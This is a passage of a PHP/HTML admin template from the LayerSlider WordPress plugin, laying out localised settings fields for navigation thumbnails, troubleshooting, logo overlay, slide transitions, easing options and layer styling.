							<td class="desc"><?php _e('If enabled, the prev and next buttons will be shown only if you move your mouse cursor over the slider.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Bottom navigation on hover', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="hoverbottomnav"></td>
							<td class="desc"><?php _e('The bottom navigation controls (with also thumbnails) will be shown only if you move your mouse cursor over the slider.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Show bar timer', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="bartimer"></td>
							<td class="desc"><?php _e('You can hide or show the bar timer with this option.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Show circle timer', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="circletimer" checked="checked"></td>
							<td class="desc"><?php _e('You can hide or show the circle timer with this option.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Thumbnail navigation', 'LayerSlider') ?></td>
							<td>
								<select name="thumb_nav">
									<option value="disabled"><?php _e('disabled', 'LayerSlider') ?></option>
									<option value="hover" selected="selected"><?php _e('hover', 'LayerSlider') ?></option>
									<option value="always"><?php _e('always', 'LayerSlider') ?></option>
								</select>
							</td>
							<td class="desc"></td>
						</tr>
						<tr>
							<td><?php _e('Thumbnail width', 'LayerSlider') ?></td>
							<td><input type="text" name="thumb_width" value="100"></td>
							<td class="desc"><?php _e('The width of the thumbnails in the navigation area.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Thumbnail height', 'LayerSlider') ?></td>
							<td><input type="text" name="thumb_height" value="60"></td>
							<td class="desc"><?php _e('The height of the thumbnails in the navigation area.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Thumbnail container width', 'LayerSlider') ?></td>
							<td><input type="text" name="thumb_container_width" value="60%"></td>
							<td class="desc"><?php _e('The width of the thumbnail navigation area.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Thumbnail active opacity', 'LayerSlider') ?></td>
							<td><input type="text" name="thumb_active_opacity" value="35"></td>
							<td class="desc"><?php _e('The selected thumbnail opacity (0-100).', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Thumbnail inactive opacity', 'LayerSlider') ?></td>
							<td><input type="text" name="thumb_inactive_opacity" value="100"></td>
							<td class="desc"><?php _e('The opacity of inactive thumbnails (0-100).', 'LayerSlider') ?></td>
						</tr>
					</tbody>
					<thead>
						<tr>
							<td colspan="3">
								<span id="ls-icon-misc"></span>
								<h4><?php _e('Misc', 'LayerSlider') ?></h4>
							</td>
						</tr>
					</thead>
					<tbody>
						<tr>
							<td><?php _e('Image preload', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="imgpreload" checked="checked"></td>
							<td class="desc"><?php _e('Preloads all images and background-images of the next slide.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('Use relative URLs', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="relativeurls"></td>
							<td class="desc"><?php _e('If enabled, LayerSlider WP will use relative URLs for images.', 'LayerSlider') ?></td>
						</tr>
					</tbody>
					<thead>
						<tr>
							<td colspan="3">
								<span id="ls-icon-troubleshooting"></span>
								<h4><?php _e('Troubleshooting', 'LayerSlider') ?></h4>
							</td>
						</tr>
					</thead>
					<tbody>
						<tr>
							<td><?php _e('Put JS includes to body', 'LayerSlider') ?></td>
							<td><input type="checkbox" name="bodyinclude"></td>
							<td class="desc"><?php _e("If the slider doesn't showing up on your front-end page, you probably have a jQuery conflict when multiple libraries loaded to the document and causes a Javascript error. Enabling this option may solve your problem. Please don't enable this option if you don't experiencing any issues.", "LayerSlider") ?></td>
						</tr>
					</tbody>
					<thead>
						<tr>
							<td colspan="3">
								<span id="ls-icon-yourlogo"></span>
								<h4><?php _e('YourLogo', 'LayerSlider') ?></h4>
							</td>
						</tr>
					</thead>
					<tbody>
						<tr>
							<td><?php _e('YourLogo', 'LayerSlider') ?></td>
							<td>
								<div class="reset-parent">
									<input type="text" name="yourlogo" class="input ls-upload">
									<span class="ls-reset">x</span>
								</div>
							</td>
							<td class="desc"><?php _e('This is a fixed layer that will be shown above of LayerSlider container. For example if you want to display your own logo, etc., you can upload an image or choose one from the Media Library.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('YourLogo style', 'LayerSlider') ?></td>
							<td><input type="text" name="yourlogostyle" value="left: 10px; top: 10px;" class="input"></td>
							<td class="desc"><?php _e('You can style your logo. You can use any CSS properties, for example you can add left and top properties to place the image inside the LayerSlider container anywhere you want.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('YourLogo link', 'LayerSlider') ?></td>
							<td>
								<div class="reset-parent">
									<input type="text" name="yourlogolink" class="input">
									<span class="ls-reset">x</span>
								</div>
							</td>
							<td class="desc"><?php _e('You can add a link to your logo. Set false is you want to display only an image without a link.', 'LayerSlider') ?></td>
						</tr>
						<tr>
							<td><?php _e('YourLogo link target', 'LayerSlider') ?></td>
							<td>
								<select name="yourlogotarget">
									<option>_self</option>
									<option>_blank</option>
									<option>_parent</option>
									<option>_top</option>
								</select>
							</td>
							<td class="desc"><?php _e("If '_blank', the clicked url will open in a new window.", "LayerSlider") ?></td>
						</tr>
					</tbody>
				</table>
			</div>
		</div>

		<!-- Layers -->
		<div class="ls-page">

			<div id="ls-layer-tabs">
				<a href="#" class="active">Slide #1 <span>x</span></a>
				<a href="#" class="unsortable" id="ls-add-layer"><?php _e('Add new slide', 'LayerSlider') ?></a>
				<div class="unsortable clear"></div>
			</div>
			<div id="ls-layers">
				<div class="ls-box ls-layer-box active">
					<input type="hidden" name="layerkey" value="0">
					<table>
						<thead class="ls-layer-options-thead">
							<tr>
								<td colspan="7">
									<span id="ls-icon-layer-options"></span>
									<h4>
										<?php _e('Slide Options', 'LayerSlider') ?>
										<a href="#" class="duplicate ls-layer-duplicate"><?php _e('Duplicate this slide', 'LayerSlider') ?></a>
									</h4>
								</td>
							</tr>
						</thead>
						<tbody class="ls-slide-options">
							<input type="hidden" name="3d_transitions" value="">
							<input type="hidden" name="2d_transitions" value="">
							<input type="hidden" name="custom_3d_transitions" value="">
							<input type="hidden" name="custom_2d_transitions" value="">
							<tr>
								<td class="right"><?php _e('Slide options', 'LayerSlider') ?></td>
								<td class="right"><?php _e('Image', 'LayerSlider') ?></td>
								<td>
									<div class="reset-parent">
										<input type="text" name="background" class="ls-upload" value="" data-help="<?php _e('The slide image/background. Click into the field to open the WordPress Media Library to choose or upload an image.', 'LayerSlider') ?>">
										<span class="ls-reset">x</span>
									</div>
								</td>
								<td class="right"><?php _e('Thumbnail', 'LayerSlider') ?></td>
								<td>
									<div class="reset-parent">
										<input type="text" name="thumbnail" class="ls-upload" value="" data-help="<?php _e('The thumbnail image of this slide. Click into the field to open the WordPress Media Library to choose or upload an image. If you leave this field empty, the slide image will be used.', 'LayerSlider') ?>">
										<span class="ls-reset">x</span>
									</div>
								</td>
								<td class="right"><?php _e('Slide delay', 'LayerSlider') ?></td>
								<td><input type="text" name="slidedelay" class="layerprop" value="4000" data-help="<?php _e("Here you can set the time interval between slide changes, this slide will stay visible for the time specified here. This value is in millisecs, so the value 1000 means 1 second. Please don't use 0 or very low values.", "LayerSlider") ?>"> (ms)</td>
							</tr>
							<tr>
								<td class="right"><?php _e('Slide transition', 'LayerSlider') ?></td>
								<td class="right">Use 3D/2D</td>
								<td>
									<input type="checkbox" name="new_transitions" checked="checked" data-help="<?php _e('You can choose between the old and the new 3D/2D slide transitions introduced in version 4.0.0.', 'LayerSlider') ?>">
									<span>Old transition</span>
								</td>
								<td class="right">
									<span class="new"><?php _e('Transitions', 'LayerSlider') ?></span>
									<span class="ls-hidden old"><?php _e('Direction', 'LayerSlider') ?></span>
								</td>
								<td>
									<select name="slidedirection" class="layerprop ls-hidden old" data-help="<?php _e('The slide will slide in from this direction.', 'LayerSlider') ?>">
										<option value="top"><?php _e('top', 'LayerSlider') ?></option>
										<option value="right" selected="selected"><?php _e('right', 'LayerSlider') ?></option>
										<option value="bottom"><?php _e('bottom', 'LayerSlider') ?></option>
										<option value="left"><?php _e('left', 'LayerSlider') ?></option>
									</select>
									<button class="button ls-select-transitions new" data-help="<?php _e('You can select your desired slide transitions by clicking on this button.', 'LayerSlider') ?>">Select transitions</button>
								</td>
								<td class="right"><span class="new"><?php _e('Time shift', 'LayerSlider') ?></span></td>
								<td><input type="text" name="timeshift" class="new layerprop" value="0" data-help="<?php _e('You can control here the timing of the layer animations when the slider changes to this slide with a 3D/2D transition. Zero means that the layers of this slide will animate in when the slide transition ends. You can time-shift the starting time of the layer animations with positive or negative values.', 'LayerSlider') ?>"> <span class="new">(ms)</span></td>
							</tr>
							<tr class="ls-old-transitions ls-hidden">
								<td class="right"><?php _e('Slide in', 'LayerSlider') ?></td>
								<td class="right"><?php _e('Duration', 'LayerSlider') ?></td>
								<td><input type="text" name="durationin" class="layerprop" value="1500" data-help="<?php _e('The duration of the slide in animation. This value is in millisecs, so the value 1000 means 1 second.', 'LayerSlider') ?>"> (ms)</td>
								<td class="right"><a href="http://easings.net/" target="_blank"><?php _e('Easing', 'LayerSlider') ?></a></td>
								<td>
									<select name="easingin" class="layerprop" data-help="<?php _e('The timing function of the animation, with it you can manipualte the slide movement. Please click on the link next to this select field to open easings.net for more information and real-time examples.', 'LayerSlider') ?>">
										<option>linear</option>
										<option>swing</option>
										<option>easeInQuad</option>
										<option>easeOutQuad</option>
										<option>easeInOutQuad</option>
										<option>easeInCubic</option>
										<option>easeOutCubic</option>
										<option>easeInOutCubic</option>
										<option>easeInQuart</option>
										<option>easeOutQuart</option>
										<option>easeInOutQuart</option>
										<option>easeInQuint</option>
										<option>easeOutQuint</option>
										<option selected="selected">easeInOutQuint</option>
										<option>easeInSine</option>
										<option>easeOutSine</option>
										<option>easeInOutSine</option>
										<option>easeInExpo</option>
										<option>easeOutExpo</option>
										<option>easeInOutExpo</option>
										<option>easeInCirc</option>
										<option>easeOutCirc</option>
										<option>easeInOutCirc</option>
										<option>easeInElastic</option>
										<option>easeOutElastic</option>
										<option>easeInOutElastic</option>
										<option>easeInBack</option>
										<option>easeOutBack</option>
										<option>easeInOutBack</option>
										<option>easeInBounce</option>
										<option>easeOutBounce</option>
										<option>easeInOutBounce</option>
									</select>
								</td>
								<td class="right"><?php _e('Delay in', 'LayerSlider') ?></td>
								<td><input type="text" name="delayin" class="layerprop"value="0"  data-help="<?php _e('Delay before the animation start when the slide slides in. This value is in millisecs, so the value 1000 means 1 second.', 'LayerSlider') ?>"> (ms)</td>
							</tr>
							<tr class="ls-old-transitions ls-hidden">
								<td class="right"><?php _e('Slide out', 'LayerSlider') ?></td>
								<td class="right"><?php _e('Duration', 'LayerSlider') ?></td>
								<td><input type="text" name="durationout" class="layerprop" value="1500"  data-help="<?php _e('The duration of the slide out animation. This value is in millisecs, so the value 1000 means 1 second.', 'LayerSlider') ?>"> (ms)</td>
								<td class="right"><a href="http://easings.net/" target="_blank"><?php _e('Easing', 'LayerSlider') ?></a></td>
								<td>
									<select name="easingout" class="layerprop" data-help="<?php _e('The timing function of the animation, with it you can manipualte the slide movement. Please click on the link next to this select field to open easings.net for more information and real-time examples.', 'LayerSlider') ?>">
										<option>linear</option>
										<option>swing</option>
										<option>easeInQuad</option>
										<option>easeOutQuad</option>
										<option>easeInOutQuad</option>
										<option>easeInCubic</option>
										<option>easeOutCubic</option>
										<option>easeInOutCubic</option>
										<option>easeInQuart</option>
										<option>easeOutQuart</option>
										<option>easeInOutQuart</option>
										<option>easeInQuint</option>
										<option>easeOutQuint</option>
										<option selected="selected">easeInOutQuint</option>
										<option>easeInSine</option>
										<option>easeOutSine</option>
										<option>easeInOutSine</option>
										<option>easeInExpo</option>
										<option>easeOutExpo</option>
										<option>easeInOutExpo</option>
										<option>easeInCirc</option>
										<option>easeOutCirc</option>
										<option>easeInOutCirc</option>
										<option>easeInElastic</option>
										<option>easeOutElastic</option>
										<option>easeInOutElastic</option>
										<option>easeInBack</option>
										<option>easeOutBack</option>
										<option>easeInOutBack</option>
										<option>easeInBounce</option>
										<option>easeOutBounce</option>
										<option>easeInOutBounce</option>
									</select>
								</td>
								<td class="right"><?php _e('Delay out', 'LayerSlider')  ?></td>
								<td><input type="text" name="delayout" class="layerprop" value="0"  data-help="<?php _e('Delay before the animation start when the slide slides out. This value is in millisecs, so the value 1000 means 1 second.', 'LayerSlider') ?>"> (ms)</td>
							</tr>
							<tr>
								<td class="right"><?php _e('Link this slide', 'LayerSlider'); ?></td>
								<td class="right"><?php _e('Link URL', 'LayerSlider') ?></td>
								<td><input type="text" name="layer_link" value="" data-help="<?php _e('If you want to link the whole slide, enter the URL of your link here.', 'LayerSlider') ?>"></td>
								<td class="right"><?php _e('Link target', 'LayerSlider') ?></td>
								<td>
									<select name="layer_link_target" data-help="<?php _e('You can control here the link behaviour: _self means the linked page will open in the current tab/window, _blank will create a new tab/window.', 'LayerSlider') ?>">
										<option>_self</option>
										<option>_blank</option>
										<option>_parent</option>
										<option>_top</option>
									</select>
								</td>
								<td></td>
								<td></td>
							</tr>
							<tr>
								<td class="right"><?php _e('Misc', 'LayerSlider') ?></td>
								<td class="right"><?php _e('#ID', 'LayerSlider') ?></td>
								<td><input type="text" name="id" value="" data-help="<?php _e('You can apply an ID attribute on the HTML element of this slide to work with it in your custom CSS or Javascript code.', 'LayerSlider') ?>"></td>
								<td class="right"><?php _e('Deeplink', 'LayerSlider') ?></td>
								<td><input type="text" name="deeplink" data-help="<?php _e('You can specify a slide alias name which you can use in your URLs with a hash mark, so LayerSlider will start with the correspondig slide.', 'LayerSlider') ?>"></td>
								<td class="right"><?php _e('Hidden', 'LayerSlider') ?></td>
								<td><input type="checkbox" name="skip" class="checkbox" data-help="<?php _e("If you don't want to use this slide in your front-page, but you want to keep it, you can hide it with this switch.", "LayerSlider") ?>"></td>
							</tr>
						</tbody>
					</table>
					<table>
						<thead>
							<tr>
								<td>
									<span id="ls-icon-preview"></span>
									<h4><?php _e('Preview', 'LayerSlider') ?></h4>
								</td>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td class="ls-preview-td">
									<div class="ls-preview-wrapper">
										<div class="ls-preview">
											<div class="draggable ls-layer"></div>
										</div>
										<div class="ls-real-time-preview"></div>
										<button class="button ls-preview-button"><?php _e('Enter Preview', 'LayerSlider') ?></button>
									</div>
								</td>
							</tr>
						</tbody>
					</table>
					<table>
						<thead>
							<tr>
								<td>
									<span id="ls-icon-sublayers"></span>
									<h4><?php _e('Layers', 'LayerSlider') ?></h4>
								</td>
							</tr>
						</thead>
						<tbody class="ls-sublayers ls-sublayer-sortable">
							<tr class="active">
								<td>
									<div class="ls-sublayer-wrapper">
										<span class="ls-sublayer-number">1</span>
										<span class="ls-highlight"><input type="checkbox" class="noreplace"></span>
										<span class="ls-icon-eye"></span>
										<span class="ls-icon-lock"></span>
										<input type="text" name="subtitle" class="ls-sublayer-title" value="Layer #1">
										<div class="clear"></div>
										<div class="ls-sublayer-nav">
											<a href="#" class="active"><?php _e('Basic', 'LayerSlider') ?></a>
											<a href="#"><?php _e('Options', 'LayerSlider') ?></a>
											<a href="#"><?php _e('Link', 'LayerSlider') ?></a>
											<a href="#"><?php _e('Style', 'LayerSlider') ?></a>
											<a href="#"><?php _e('Attributes', 'LayerSlider') ?></a>
											<a href="#" title="<?php _e('Remove this layer', 'LayerSlider') ?>" class="remove">x</a>
										</div>
										<div class="ls-sublayer-pages">
											<div class="ls-sublayer-page ls-sublayer-basic active">
												<select name="type">
													<option selected="selected">img</option>
													<option>div</option>
													<option>p</option>
													<option>span</option>
													<option>h1</option>
													<option>h2</option>
													<option>h3</option>
													<option>h4</option>
													<option>h5</option>
													<option>h6</option>
												</select>

												<div class="ls-sublayer-types">
													<span class="ls-type">
														<span class="ls-icon-img"></span><br>
														<?php _e('Image', 'LayerSlider') ?>
													</span>

													<span class="ls-type">
														<span class="ls-icon-div"></span><br>
														<?php _e('Div / Video', 'LayerSlider') ?>
													</span>

													<span class="ls-type">
														<span class="ls-icon-p"></span><br>
														<?php _e('Paragraph', 'LayerSlider') ?>
													</span>

													<span class="ls-type">
														<span class="ls-icon-span"></span><br>
														<?php _e('Span', 'LayerSlider') ?>
													</span>

													<span class="ls-type">
														<span class="ls-icon-h1"></span><br>
														<?php _e('H1', 'LayerSlider') ?>
													</span>

													<span class="ls-type">
														<span class="ls-icon-h2"></span><br>
														<?php _e('H2', 'LayerSlider') ?>
													</span>

													<span class="ls-type">
														<span class="ls-icon-h3"></span><br>
														<?php _e('H3', 'LayerSlider') ?>
													</span>

													<span class="ls-type">
														<span class="ls-icon-h4"></span><br>
														<?php _e('H4', 'LayerSlider') ?>
													</span>

													<span class="ls-type">
														<span class="ls-icon-h5"></span><br>
														<?php _e('H5', 'LayerSlider') ?>
													</span>

													<span class="ls-type">
														<span class="ls-icon-h6"></span><br>
														<?php _e('H6', 'LayerSlider') ?>
													</span>
												</div>

												<div class="ls-image-uploader">
													<img src="<?php echo $GLOBALS['lsPluginPath'].'/img/transparent.png' ?>" alt="layer image">
													<input type="text" name="image"  class="<?php echo $uploadClass ?>" value="">
													<p>
														<?php _e('Click into this text field to open WordPress Media Library where you can upload new images or select previously used ones.', 'LayerSlider') ?>
													</p>
												</div>

												<div class="ls-html-code">
													<h5><?php _e('Custom HTML content', 'LayerSlider') ?></h5>
													<textarea name="html" cols="50" rows="5" data-help="<?php _e('Type here the contents of your layer. You can use any HTML codes in this field to insert other contents then text. This field is also shortcode-aware, so you can insert content from other plugins as well as video embed codes.', 'LayerSlider') ?>"></textarea>
												</div>
											</div>
											<div class="ls-sublayer-page ls-sublayer-options">
												<table>
													<tbody>
														<tr>
															<td rowspan="2"><?php _e('Transition in', 'LayerSlider') ?></td>
															<td class="right"><?php _e('Type', 'LayerSlider') ?></td>
															<td>
																<select name="slidedirection" class="sublayerprop" data-help="<?php _e('The type of the transition.', 'LayerSlider') ?>">
																	<option value="fade"><?php _e('Fade', 'LayerSlider') ?></option>
																	<option value="auto" selected="selected"><?php _e('Auto (Slide from auto direction)', 'LayerSlider') ?></option>
																	<option value="top"><?php _e('Top (Slide from top)', 'LayerSlider') ?></option>
																	<option value="right"><?php _e('Right (Slide from right)', 'LayerSlider') ?></option>
																	<option value="bottom"><?php _e('Bottom (Slide from bottom)', 'LayerSlider') ?></option>
																	<option value="left"><?php _e('Left (Slide from left)', 'LayerSlider') ?></option>
																</select>
															</td>
															<td class="right"><?php _e('Duration', 'LayerSlider') ?></td>
															<td><input type="text" name="durationin" class="sublayerprop" value="1000" data-help="<?php _e('The duration of the slide in animation. This value is in millisecs, so the value 1000 means 1 second. Lower values results faster animations.', 'LayerSlider') ?>"> (ms)</td>
															<td class="right"><a href="http://easings.net/" target="_blank"><?php _e('Easing', 'LayerSlider') ?></a></td>
															<td>
																<select name="easingin" class="sublayerprop" data-help="<?php _e('The timing function of the animation, with it you can manipualte the layer movement. Please click on the link next to this select field to open easings.net for more information and real-time examples.', 'LayerSlider') ?>">
																	<option>linear</option>
																	<option>swing</option>
																	<option>easeInQuad</option>
																	<option>easeOutQuad</option>
																	<option>easeInOutQuad</option>
																	<option>easeInCubic</option>
																	<option>easeOutCubic</option>
																	<option>easeInOutCubic</option>
																	<option>easeInQuart</option>
																	<option>easeOutQuart</option>
																	<option>easeInOutQuart</option>
																	<option>easeInQuint</option>
																	<option>easeOutQuint</option>
																	<option selected="selected">easeInOutQuint</option>
																	<option>easeInSine</option>
																	<option>easeOutSine</option>
																	<option>easeInOutSine</option>
																	<option>easeInExpo</option>
																	<option>easeOutExpo</option>
																	<option>easeInOutExpo</option>
																	<option>easeInCirc</option>
																	<option>easeOutCirc</option>
																	<option>easeInOutCirc</option>
																	<option>easeInElastic</option>
																	<option>easeOutElastic</option>
																	<option>easeInOutElastic</option>
																	<option>easeInBack</option>
																	<option>easeOutBack</option>
																	<option>easeInOutBack</option>
																	<option>easeInBounce</option>
																	<option>easeOutBounce</option>
																	<option>easeInOutBounce</option>
																</select>
															</td>
															<td class="right"><?php _e('Delay', 'LayerSlider') ?></td>
															<td><input type="text" name="delayin" class="sublayerprop" value="0" data-help="<?php _e('Delay before the animation start when the layer slides in. This value is in millisecs, so the value 1000 means 1 second.', 'LayerSlider') ?>"> (ms)</td>
														</tr>

														<tr>
															<td class="right notfirst"><?php _e('Rotation', 'LayerSlider') ?></td>
															<td><input type="text" name="rotatein" value="0" class="sublayerprop" data-help="You can set the initial rotation of this layer here which will animate to the default (0deg) value. You can use negative values."></td>
															<td class="right"><?php _e('Scale', 'LayerSlider') ?></td>
															<td><input type="text" name="scalein" value="1.0" class="sublayerprop" data-help="You can set the initial scale of this layer here which will be animated to the default (1.0) value."></td>
															<td class="right"></td>
															<td></td>
															<td class="right"></td>
															<td></td>
														</tr>

														<tr>
															<td rowspan="2"><?php _e('Transition out', 'LayerSlider') ?></td>
															<td class="right"><?php _e('Type', 'LayerSlider') ?></td>
															<td>
																<select name="slideoutdirection" class="sublayerprop" data-help="<?php _e('The type of the transition.', 'LayerSlider') ?>">
																	<option value="fade"><?php _e('Fade', 'LayerSlider') ?></option>
																	<option value="auto" selected="selected"><?php _e('Auto (Slide to auto direction)', 'LayerSlider') ?></option>
																	<option value="top"><?php _e('Top (Slide to top)', 'LayerSlider') ?></option>
																	<option value="right"><?php _e('Right (Slide to right)', 'LayerSlider') ?></option>
																	<option value="bottom"><?php _e('Bottom (Slide to bottom)', 'LayerSlider') ?></option>
																	<option value="left"><?php _e('Left (Slide to left)', 'LayerSlider') ?></option>
																</select>
															</td>
															<td class="right"><?php _e('Duration', 'LayerSlider') ?></td>
															<td><input type="text" name="durationout" class="sublayerprop" value="1000" data-help="<?php _e('The duration of the slide out animation. This value is in millisecs, so the value 1000 means 1 second. Lower values results faster animations.', 'LayerSlider') ?>"> (ms)</td>
															<td class="right"><a href="http://easings.net/" target="_blank"><?php _e('Easing', 'LayerSlider') ?></a></td>
															<td>
																<select name="easingout" class="sublayerprop" data-help="<?php _e('The timing function of the animation, with it you can manipualte the layer movement. Please click on the link next to this select field to open easings.net for more information and real-time examples.', 'LayerSlider') ?>">
																	<option>linear</option>
																	<option>swing</option>
																	<option>easeInQuad</option>
																	<option>easeOutQuad</option>
																	<option>easeInOutQuad</option>
																	<option>easeInCubic</option>
																	<option>easeOutCubic</option>
																	<option>easeInOutCubic</option>
																	<option>easeInQuart</option>
																	<option>easeOutQuart</option>
																	<option>easeInOutQuart</option>
																	<option>easeInQuint</option>
																	<option>easeOutQuint</option>
																	<option selected="selected">easeInOutQuint</option>
																	<option>easeInSine</option>
																	<option>easeOutSine</option>
																	<option>easeInOutSine</option>
																	<option>easeInExpo</option>
																	<option>easeOutExpo</option>
																	<option>easeInOutExpo</option>
																	<option>easeInCirc</option>
																	<option>easeOutCirc</option>
																	<option>easeInOutCirc</option>
																	<option>easeInElastic</option>
																	<option>easeOutElastic</option>
																	<option>easeInOutElastic</option>
																	<option>easeInBack</option>
																	<option>easeOutBack</option>
																	<option>easeInOutBack</option>
																	<option>easeInBounce</option>
																	<option>easeOutBounce</option>
																	<option>easeInOutBounce</option>
																</select>
															</td>
															<td class="right"><?php _e('Delay', 'LayerSlider') ?></td>
															<td><input type="text" name="delayout" class="sublayerprop" value="0" data-help="<?php _e('Delay before the animation start when the layer slides out. This value is in millisecs, so the value 1000 means 1 second.', 'LayerSlider') ?>"> (ms)</td>
														</tr>

														<tr>
															<td class="right notfirst"><?php _e('Rotation', 'LayerSlider') ?></td>
															<td><input type="text" name="rotateout" value="0" class="sublayerprop" data-help="You can set the ending rotation here, this sublayer will be animated from the default (0deg) value to yours. You can use negative values."></td>
															<td class="right"><?php _e('Scale', 'LayerSlider') ?></td>
															<td><input type="text" name="scaleout" value="1.0" class="sublayerprop" data-help="You can set the ending scale value here, this sublayer will be animated from the default (1.0) value to yours."></td>
															<td class="right"></td>
															<td></td>
															<td class="right"></td>
															<td></td>
														</tr>

														<tr>
															<td><?php _e('Other options', 'LayerSlider') ?></td>
															<td class="right"><?php _e('Distance', 'LayerSlider') ?></td>
															<td><input type="text" name="level" value="-1" data-help="<?php _e('The default value is -1 which means that the layer will be positioned exactly outside of the slide container. You can use the default setting in most of the cases. If you need to set the start or end position of the layer from further of the edges of the slide container, you can use 2, 3 or higher values.', 'LayerSlider') ?>"></td>
															<td class="right"><?php _e('Show until', 'LayerSlider') ?></td>
															<td><input type="text" name="showuntil" class="sublayerprop" value="0" data-help="<?php _e('The layer will be visible for the time you specify here, then it will slide out. You can use this setting for layers to leave the slide before the slide itself animates out, or for example before other layers will slide in. This value in millisecs, so the value 1000 means 1 second.', 'LayerSlider') ?>"> (ms)</td>
															<td class="right"><?php _e('Hidden', 'LayerSlider') ?></td>
															<td><input type="checkbox" name="skip" class="checkbox" data-help="<?php _e("If you don't want to use this layer, but you want to keep it, you can hide it with this switch.", "LayerSlider") ?>"></td>
															<td colspan="3"><button class="button duplicate" data-help="<?php _e('If you will use similar settings for other layers or you want to experiment on a copy, you can duplicate this layer.', 'LayerSlider') ?>"><?php _e('Duplicate this layer', 'LayerSlider') ?></button></td>
														</tr>
												</table>
											</div>
											<div class="ls-sublayer-page ls-sublayer-link">
												<table>
													<tbody>
														<tr>
															<td><?php _e('URL', 'LayerSlider') ?></td>
															<td class="url"><input type="text" name="url" value="" data-help="<?php _e('If you want to link your layer, type here the URL. You can use a hash mark followed by a number to link this layer to another slide. Example: #3 - this will switch to the third slide.', 'LayerSlider') ?>"></td>
															<td>
																<select name="target" data-help="<?php _e('You can control here the link behaviour: _self means the linked page will open in the current tab/window, _blank will open it in a new tab/window.', 'LayerSlider') ?>">
																	<option>_self</option>
																	<option>_blank</option>
																	<option>_parent</option>
																	<option>_top</option>
																</select>
															</td>
														</tr>
													</tbody>
												</table>
											</div>
											<div class="ls-sublayer-page ls-sublayer-style">
												<input type="hidden" name="styles">
												<table>
													<tbody>
														<tr>
															<td><?php _e('Layout & Positions', 'LayerSlider') ?></td>
															<td class="right"><?php _e('Width', 'LayerSlider') ?></td>
															<td><input type="text" name="width" class="auto" value="" data-help="<?php _e("You can set the width of your layer. You can use pixels, percents, or the default value 'auto'. Examples: 100px, 50% or auto", "LayerSlider") ?>"></td>
															<td class="right"><?php _e('Height', 'LayerSlider') ?></td>
															<td><input type="text" name="height" class="auto" value="" data-help="<?php _e("You can set the height of your layer. You can use pixels, percents, or the default value 'auto'. Examples: 100px, 50% or auto", "LayerSlider") ?>"></td>
															<td class="right"><?php _e('Top', 'LayerSlider') ?></td>
															<td><input type="text" name="top" value="0px" data-help="<?php _e("The layer position from the top of the slide. You can use pixels and percents. Examples: 100px or 50%. You can move your layers in the preview above with a drag n' drop, or set the exact values here.", "LayerSlider") ?>"></td>
															<td class="right"><?php _e('Left', 'LayerSlider') ?></td>
															<td><input type="text" name="left" value="0px" data-help="<?php _e("The layer position from the left side of the slide. You can use pixels and percents. Examples: 100px or 50%. You can move your layers in the preview above with a drag n' drop, or set the exact values here.", "LayerSlider") ?>"></td>
														</tr>
														<tr>
															<td><?php _e('Padding', 'LayerSlider') ?></td>
															<td class="right"><?php _e('Top', 'LayerSlider') ?></td>
															<td><input type="text" name="padding-top" class="auto" value="" data-help="<?php _e('Padding on the top of the layer. Example: 10px', 'LayerSlider') ?>"></td>
															<td class="right"><?php _e('Right', 'LayerSlider') ?></td>
															<td><input type="text" name="padding-right" class="auto" value="" data-help="<?php _e('Padding on the right side of the layer. Example: 10px', 'LayerSlider') ?>"></td>
															<td class="right"><?php _e('Bottom', 'LayerSlider') ?></td>
															<td><input type="text" name="padding-bottom" class="auto" value="" data-help="<?php _e('Padding on the bottom of the layer. Example: 10px', 'LayerSlider') ?>"></td>
															<td class="right"><?php _e('Left', 'LayerSlider') ?></td>
															<td><input type="text" name="padding-left" class="auto" value="" data-help="<?php _e('Padding on the left side of the layer. Example: 10px', 'LayerSlider') ?>"></td>
														</tr>
														<tr>
															<td><?php _e('Border', 'LayerSlider') ?></td>
															<td class="right"><?php _e('Top', 'LayerSlider') ?></td>
															<td><input type="text" name="border-top" class="auto" value="" data-help="<?php _e('Border on the top of the layer. Example: 5px solid #000', 'LayerSlider') ?>"></td>
															<td class="right"><?php _e('Right', 'LayerSlider') ?></td>
															<td><input type="text" name="border-right" class="auto" value="" data-help="<?php _e('Border on the right side of the layer. Example: 5px solid #000', 'LayerSlider') ?>"></td>
															<td class="right"><?php _e('Bottom', 'LayerSlider') ?></td>
															<td><input type="text" name="border-bottom" class="auto" value="" data-help="<?php _e('Border on the bottom of the layer. Example: 5px solid #000', 'LayerSlider') ?>"></td>
															<td class="right"><?php _e('Left', 'LayerSlider') ?></td>
															<td><input type="text" name="border-left" class="auto" value="" data-help="<?php _e('Border on the left side of the layer. Example: 5px solid #000', 'LayerSlider') ?>"></td>
														</tr>
														<tr>
															<td><?php _e('Font', 'LayerSlider') ?></td>
															<td class="right"><?php _e('Family', 'LayerSlider') ?></td>
															<td><input type="text" name="font-family" class="auto" value="" data-help="<?php _e('List of your chosen fonts separated with a comma. Please use apostrophes if your font names contains white spaces. Example: Helvetica, Arial, sans-serif', 'LayerSlider') ?>"></td>
															<td class="right"><?php _e('Size', 'LayerSlider') ?></td>
															<td><input type="text" name="font-size" class="auto" value="" data-help="<?php _e('The font size in pixels. Example: 16px.', 'LayerSlider') ?>"></td>
															<td class="right"><?php _e('Line-height', 'LayerSlider') ?></td>
															<td><input type="text" name="line-height" class="auto" value="" data-help="<?php _e("The line height of your text. The default setting is 'normal'. Example: 22px", "LayerSlider") ?>"></td>
															<td class="right"><?php _e('Color', 'LayerSlider') ?></td>
